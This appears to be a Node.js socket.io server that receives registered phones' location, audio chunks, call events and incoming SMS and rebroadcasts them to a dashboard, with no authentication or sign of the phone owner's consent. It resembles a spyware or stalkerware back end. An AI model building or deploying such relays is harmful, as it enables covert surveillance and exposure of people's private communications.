const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let devices = {}; // deviceId → socketId

io.on("connection", (socket) => {
    console.log("Client connected:", socket.id);

    // Device registers itself
    socket.on("device-register", (data) => {
        const deviceId = data.deviceId;
        const deviceName = data.deviceName || "Unknown";

        devices[deviceId] = socket.id;
        console.log(`📱 Registered device: ${deviceName} (${deviceId})`);

        // Inform dashboards
        io.emit("device-registered", { deviceId, deviceName });
    });

    // Location updates
    socket.on("location-update", (data) => {
        console.log("📍 Location from", data.deviceId, data.lat, data.lng);
        io.emit("location-update", data);
    });

    // Audio chunks
    socket.on("audio-chunk", (data) => {
        // data = { deviceId, chunk }
        io.emit("audio-chunk", data);
    });

    // Call events
    socket.on("call-event", (data) => {
        io.emit("call-event", data);
    });

    // SMS received
    socket.on("sms-received", (data) => {
        io.emit("sms-received", data);
    });

    socket.on("disconnect", () => {
        console.log("❌ Disconnected:", socket.id);
        for (let deviceId in devices) {
            if (devices[deviceId] === socket.id) {
                io.emit("device-disconnected", { deviceId });
                delete devices[deviceId];
            }
        }
    });
});

// Serve static files (dashboard)
app.use(express.static(path.join(__dirname, "public")));

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
